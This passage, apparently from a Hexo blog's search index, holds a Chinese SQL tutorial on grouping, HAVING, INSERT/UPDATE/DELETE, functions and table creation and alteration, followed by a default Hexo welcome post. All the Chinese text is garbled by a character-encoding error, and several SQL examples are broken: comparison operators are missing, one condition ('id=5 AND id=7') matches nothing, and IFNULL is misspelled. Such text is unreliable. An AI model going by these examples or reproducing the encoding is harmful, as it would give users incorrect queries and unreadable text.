deptno,max(sal) from emp group by deptno;ï¼‰ ä½¿ç”¨havingå¯ä»¥å¯¹åˆ†å®Œç»„ä¹‹åçš„æ•°æ®è¿›ä¸€æ­¥è¿‡æ»¤ï¼Œå…¶å¿…é¡»å’Œgroup byä¸€èµ·ç”¨ ä¾‹å­ï¼šæ‰¾å‡ºæ¯ä¸ªéƒ¨é—¨æœ€é«˜è–ªèµ„å¹¶ä¸”è¦æ±‚æ˜¾ç¤ºæœ€é«˜è–ªèµ„å¤§äº3000çš„æ•°æ® SELECT deptno,max(sal) FROM emp group by deptno having max(sal)3000; WHEREå®åœ¨æ²¡åŠæ³•äº†å†ç”¨having (ä¾‹å­ï¼šæ‰¾å‡ºæ¯ä¸ªéƒ¨é—¨çš„å¹³å‡è–ªèµ„ï¼Œè¦æ±‚æ˜¾ç¤ºå¹³å‡è–ªèµ„é«˜äº2500çš„) ä¿®æ”¹æ•°æ®INSERTå½“æˆ‘ä»¬éœ€è¦å‘æ•°æ®åº“è¡¨ä¸­æ’å…¥ä¸€æ¡æ–°è®°å½•æ—¶ï¼Œå°±å¿…é¡»ä½¿ç”¨INSERTè¯­å¥ã€‚ è¯­æ³•ï¼šINSERT INTO è¡¨å (å­—æ®µ1, å­—æ®µ2, â€¦) VALUES (å€¼1, å€¼2, â€¦); ä¾‹å­ï¼šæˆ‘ä»¬å‘studentsè¡¨æ’å…¥ä¸€æ¡æ–°è®°å½•ï¼Œå…ˆåˆ—ä¸¾å‡ºéœ€è¦æ’å…¥çš„å­—æ®µåç§°ï¼Œç„¶ååœ¨VALUESå­å¥ä¸­ä¾æ¬¡å†™å‡ºå¯¹åº”å­—æ®µçš„å€¼ â€‹ INSERT INTO students (class_id, name, gender, score) VALUES (2, å¤§ç‰›, M, 80); å¯ä»¥ä¸€æ¬¡æ€§æ·»åŠ å¤šæ¡è®°å½•ï¼Œåªéœ€è¦åœ¨VALUESå­å¥ä¸­æŒ‡å®šå¤šä¸ªè®°å½•å€¼ï¼Œæ¯ä¸ªè®°å½•æ˜¯ç”±**(â€¦)**åŒ…å«çš„ä¸€ç»„å€¼ï¼Œä¸­é—´ç”¨ ï¼Œ éš”å¼€ UPDATEè¯­æ³•ï¼šUPDATE è¡¨å SET å­—æ®µ1=å€¼1, å­—æ®µ2=å€¼2, ... WHERE ...; ä¾‹å­ï¼šUPDATE students SET name=å¤§ç‰›, score=66 WHERE id=1;ï¼ˆWHEREåé¢æ˜¯éœ€è¦æ›´æ–°çš„è¡Œçš„ç­›é€‰æ¡ä»¶ï¼‰ UPDATEè¯­å¥çš„WHEREæ¡ä»¶å’ŒSELECTè¯­å¥çš„WHEREæ¡ä»¶å…¶å®æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤å®Œå…¨å¯ä»¥ä¸€æ¬¡æ›´æ–°å¤šæ¡è®°å½• åœ¨UPDATEè¯­å¥ä¸­ï¼Œæ›´æ–°å­—æ®µæ—¶å¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼ ä¾‹å­ï¼šUPDATE students SET score=score+10 WHERE score80; æ³¨æ„å¦‚æœWHEREæ¡ä»¶æ²¡æœ‰åŒ¹é…åˆ°ä»»ä½•è®°å½•ï¼ŒUPDATEè¯­å¥ä¸ä¼šæŠ¥é”™ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•è®°å½•è¢«æ›´æ–° è¦ç‰¹åˆ«å°å¿ƒçš„æ˜¯ï¼ŒUPDATEè¯­å¥å¯ä»¥æ²¡æœ‰WHEREæ¡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™æ•´ä¸ªè¡¨çš„æ•°æ®éƒ½ä¼šè¢«æ›´æ–°ï¼ï¼ï¼ DELETEåŸºæœ¬è¯­æ³•ï¼šDELETE FROM è¡¨å WHERE ...; DELETEè¯­å¥ä¹Ÿå¯ä»¥ä¸€æ¬¡åˆ é™¤å¤šæ¡è®°å½•ï¼ˆä¾‹ï¼šDELETE FROM students WHERE id=5 AND id=7;ï¼‰ ä¸UPDATEè¯­å¥ç±»ä¼¼WHEREæ¡ä»¶æ²¡æœ‰åŒ¹é…åˆ°ä»»ä½•è®°å½•ï¼ŒDELETEè¯­å¥ä¸ä¼šæŠ¥é”™ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•è®°å½•è¢«åˆ é™¤ å’ŒUPDATEç±»ä¼¼ï¼Œä¸å¸¦WHEREæ¡ä»¶çš„DELETEè¯­å¥ä¼šåˆ é™¤æ•´ä¸ªè¡¨çš„æ•°æ® åœ¨æ‰§è¡ŒDELETEè¯­å¥æ—¶ä¹Ÿè¦éå¸¸å°å¿ƒï¼Œæœ€å¥½å…ˆç”¨SELECTè¯­å¥æ¥æµ‹è¯•WHEREæ¡ä»¶æ˜¯å¦ç­›é€‰å‡ºäº†æœŸæœ›çš„è®°å½•é›†ï¼Œç„¶åå†ç”¨DELETEåˆ é™¤ã€‚ æ•°æ®å¤„ç†å‡½æ•°åˆè¢«ç§°ä¸ºå•è¡Œå¤„ç†å‡½æ•°ï¼Œç‰¹ç‚¹æ˜¯ä¸€ä¸ªè¾“å…¥å¯¹åº”ä¸€ä¸ªè¾“å‡º LOWERï¼ˆè½¬æ¢æˆå°å†™ï¼‰è¯­æ³•ï¼šSELECT LOWER(å­—æ®µ) FROM è¡¨å; UPPERè½¬åŒ–æˆå¤§å†™ï¼›è¯­æ³•ï¼šSELECT UPPER(å­—æ®µ) FROM è¡¨å; SUBSTRå–å­—ç¬¦ä¸²;åŸºæœ¬è¯­æ³•ï¼šSUBSTR(æˆªå–çš„å­—ç¬¦ä¸²,èµ·å§‹ä¸‹æ ‡,æˆªå–çš„é•¿åº¦)ï¼ˆæ³¨æ„ï¼šèµ·å§‹ä¸‹æ ‡ä»1å¼€å§‹ï¼‰ ä¾‹å­ï¼šSELECT SUBSTR(name,1,1) ename from students; ä¾‹å­ï¼šSELECT ename from emp where SUBSTR(ename,1,1)=A;(æ‰¾å‡ºç¬¬ä¸€ä¸ªå­—æ¯æ˜¯Açš„äºº) LENGTHå–é•¿åº¦ï¼›è¯­æ³•ï¼šSELECT LENGTH(å­—æ®µ) FROM è¡¨å; ä¾‹å­ï¼šSELECT LENGTH(name) namelength FROM students; TRIMå»é™¤å‰åç©ºç™½ ä¾‹å­ï¼šSELECT * FROM emp WHERE ename=TRIM( King);ï¼ˆå¯ä»¥è¯•è¯•å»é™¤è¿™ä¸ªå‡½æ•°ä¼šå‘ç”Ÿä»€ä¹ˆï¼‰ ROUNDå››èˆäº”å…¥ï¼›ä¾‹å­ï¼šSELECT round(1234.567,0) result FROM emp;(0è¡¨ç¤ºä¿ç•™åˆ°æ•´æ•°ä½ï¼›-1è¡¨ç¤ºä¿ç•™åˆ°åä½æ•°) RANDè¡¨ç¤ºç”Ÿæˆéšæœºæ•°ï¼šSELECT RAND() FROM emp; ä¾‹å­ï¼š SELECT ROUND(RAND()*100,0) FROM emp;ï¼ˆ100ä»¥å†…éšæœºæ•°ï¼‰ IFNULLå¯ä»¥å°†NULLè½¬æ¢æˆä¸€ä¸ªå…·ä½“å€¼ï¼›åŸºç¡€è¯­æ³•ï¼šINFULL(æ•°æ®,è¢«å½“ä½œå“ªä¸ªå€¼); æ‰€æœ‰æ•°æ®åº“ä¸­æœ‰NULLå‚ä¸çš„æ•°å­¦è¿ç®—æœ€åç»“æœéƒ½ä¸ºNULLï¼Œä¸ºé¿å…è¿™ä¸ªç°è±¡éœ€è¦ä½¿ç”¨IFNULLå‡½æ•° ä¾‹å­ï¼šè®¡ç®—æ¯ä¸ªå‘˜å·¥çš„å¹´è–ªï¼š SELECT ename,(sal+IFNULL(comm,0))*12 as yearsal from emp; â€‹ (è¯•è¯•å»æ‰IFNULLå‡½æ•°ä¼šå‘ç”Ÿä»€ä¹ˆ) CASE..WHEN..THEN..WHEN..THEN..ELSE..ENDä¸ä¼šä¿®æ”¹æ•°æ®åº“ ä¾‹å­ï¼šå½“å‘˜å·¥ä¸ºMANAGERçš„æ—¶å€™å·¥èµ„ä¸Šè°ƒ10%ï¼Œå½“å‘˜å·¥ä¸ºSALESMANçš„æ—¶å€™å·¥èµ„ä¸Šè°ƒ50% SELECT - ename, - job, - (case job whenMANAGER then sal*1.1 when SALESMAN then sal*1.5 else sal end) newsal - from emp; è¡¨æ ¼ç›¸å…³å†…å®¹åˆ›å»ºè¡¨æ ¼çš„é€šç”¨è¯­æ³•ï¼šCREATE TABLE è¡¨å( åˆ—å1 æ•°æ®ç±»å‹2ï¼Œ åˆ—å2 æ•°æ®ç±»å‹2ï¼Œ â€¦â€¦ åˆ—ån æ•°æ®ç±»å‹n ); æ•°æ®åº“ç±»å‹ï¼š 1. intï¼šæ•´æ•°ç±»å‹ age int, 2. double:å°æ•°ç±»å‹ score double(5,2) 3. date:æ—¥æœŸï¼ŒåªåŒ…å«å¹´æœˆæ—¥ï¼Œyyyy-MM-dd 4. datetime:æ—¥æœŸï¼ŒåŒ…å«å¹´æœˆæ—¥æ—¶åˆ†ç§’ yyyy-MM-dd HH:mm:ss 5. timestamp:æ—¶é—´é”™ç±»å‹ åŒ…å«å¹´æœˆæ—¥æ—¶åˆ†ç§’ yyyy-MM-dd HH:mm:ss å¦‚æœå°†æ¥ä¸ç»™è¿™ä¸ªå­—æ®µèµ‹å€¼ï¼Œæˆ–èµ‹å€¼ä¸ºnullï¼Œåˆ™é»˜è®¤ä½¿ç”¨å½“å‰çš„ç³»ç»Ÿæ—¶é—´ï¼Œæ¥è‡ªåŠ¨èµ‹å€¼ 6. varcharï¼šå­—ç¬¦ä¸² name varchar(20):å§“åæœ€å¤§20ä¸ªå­—ç¬¦ zhangsan 8ä¸ªå­—ç¬¦ å¼ ä¸‰ 2ä¸ªå­—ç¬¦ ä¾‹å­ï¼šcreate table student( id int, name varchar(32), age int , score double(4,1), birthday date, insert_time timestamp ); å¤åˆ¶è¡¨ï¼šCREATE table è¡¨å like è¢«å¤åˆ¶çš„è¡¨åï¼› æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­æ‰€æœ‰çš„è¡¨åç§°ï¼š show tables; æŸ¥è¯¢è¡¨ç»“æ„ï¼šdesc è¡¨å; ä¿®æ”¹ ä¿®æ”¹è¡¨å alter table è¡¨å rename to æ–°çš„è¡¨å; 2. ä¿®æ”¹è¡¨çš„å­—ç¬¦é›† alter table è¡¨å character set å­—ç¬¦é›†åç§°; 3. æ·»åŠ ä¸€åˆ— alter table è¡¨å add åˆ—å æ•°æ®ç±»å‹; 4. ä¿®æ”¹åˆ—åç§° ç±»å‹ alter table è¡¨å change åˆ—å æ–°åˆ—åˆ« æ–°æ•°æ®ç±»å‹; alter table è¡¨å modify åˆ—å æ–°æ•°æ®ç±»å‹; 5. åˆ é™¤åˆ— alter table è¡¨å drop åˆ—å; åˆ é™¤è¯­æ³•ï¼šdrop table è¡¨åï¼›","tags":["sql"],"categories":["å¼€å‘"]},{"title":"Hello World","path":"/2023/10/05/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new My New Post More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment"},{"title":"å‹é“¾","path":"/friends/index.html","content":""}]